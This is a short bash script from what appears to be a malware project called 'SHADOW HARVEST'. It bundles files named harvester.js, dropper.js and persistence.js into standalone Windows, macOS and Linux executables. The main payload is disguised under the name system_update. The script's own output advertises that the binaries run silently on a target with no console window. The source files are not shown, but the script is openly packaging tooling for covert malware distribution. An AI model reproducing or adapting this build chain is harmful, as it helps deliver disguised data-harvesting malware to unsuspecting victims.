#!/bin/bash
# ============================================
# SHADOW HARVEST - Bundling Script
# Bundles JavaScript into standalone executables
# ============================================

# Install pkg globally
npm install -g pkg

# Create dist directory
mkdir -p dist

# Bundle for Windows (.exe)
pkg harvester.js --target node18-win-x64 --output dist/system_update.exe

# Bundle for macOS
pkg harvester.js --target node18-macos-x64 --output dist/system_update_mac

# Bundle for Linux
pkg harvester.js --target node18-linux-x64 --output dist/system_update_linux

# Bundle dropper
pkg dropper.js --target node18-win-x64 --output dist/dropper.exe

# Bundle persistence
pkg persistence.js --target node18-win-x64 --output dist/persistence.exe

echo ""
echo "=============================================="
echo "  BUNDLING COMPLETE"
echo "=============================================="
echo "  Windows: dist/system_update.exe"
echo "  macOS: dist/system_update_mac"
echo "  Linux: dist/system_update_linux"
echo "  Dropper: dist/dropper.exe"
echo "  Persistence: dist/persistence.exe"
echo "=============================================="
echo ""
echo "  These executables run silently."
echo "  No Node.js required on target."
echo "  No console window appears."
echo "=============================================="
